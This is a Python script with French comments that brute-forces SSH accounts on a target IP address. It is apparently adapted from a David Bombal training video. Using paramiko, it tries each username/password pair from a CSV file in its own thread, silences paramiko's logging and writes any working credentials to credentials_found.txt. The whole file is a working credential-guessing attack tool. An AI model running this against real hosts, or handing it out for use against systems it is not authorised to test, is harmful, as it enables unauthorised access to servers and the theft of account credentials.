#################################################################################################
# Script qui permet, par brute force, de récupérer/casser un compte SSH sur une IP en entrée
# Eléments récupérer sur une TP de David BOMBAL (https://www.youtube.com/watch?v=BSugciSUIek).
#
# Je vais 'modestement' essayer de le compléter, de l'améliorer.
#       VO : copie de DB le 10/12/2022 (avec Francisation des commentaires et libellés)
#################################################################################################

import csv
import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception

# C'est avec cette fonction que l'on va se connecter au client cible


def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # On bypasse le demande/confirmation de récupération de clé
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # On essai un connection SSH sur le port 22 (standard) avec le couple username/password issu du fichier cvs
        ssh_client.connect(host, port=22, username=username,
                           password=password, banner_timeout=300)
        # Si on n'obtient pas d'erreur, bingo ! --> on log l'info qui match dans un fichier pour debrief
        with open("credentials_found.txt", "a") as fh:
            # On écrit les crédentials qui matchent
            print(f"Username - {username} and Password - {password} found.")
            fh.write(
                f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")

# Cette fonction récupère ue adresse IP après de l'utilisateur


def get_ip_address():
    # Tant que l'on a pas obtenu un @IP, on boucle
    while True:
        host = input("Merci d'entrer l'adresse ip du host cible: ")
        try:
            # on vérifie que l'on a bien un adresse IP valide. On le retourne si oui
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # si l'adresse IP n'est pas valide, on remonte une erreur
            print("Merci de saisie une adresse ip valide.")


# Le programme commence ici
def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # To keep to functional programming standards we declare ssh_port inside a function.
    # fichier qui contient la liste des mots de passe qui vont être testés
    list_file = "passwords.csv"
    host = get_ip_address()         # on demande ici l'@IP qui sera contacté
    # On ouvre le fichier des mots de passe et on le parcours.
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
        # We use the enumerate() on the csv_reader object. This allows us to access the index and the data.
        for index, row in enumerate(csv_reader):
            # The 0 index is where the headings are allocated.
            if index == 0:
                continue
            else:
                #  We create a thread on the ssh_connect function, and send the correct arguments to it.
                t = threading.Thread(target=ssh_connect,
                                     args=(host, row[0], row[1],))
                # On lance la connection pour le couple usernamne/password
                t.start()
                # On attends un peu entre deux appels/connections
                time.sleep(0.2)
                # ssh_connect(host, ssh_port, row[0], row[1])


#  début du programme --> fonction main
__main__()
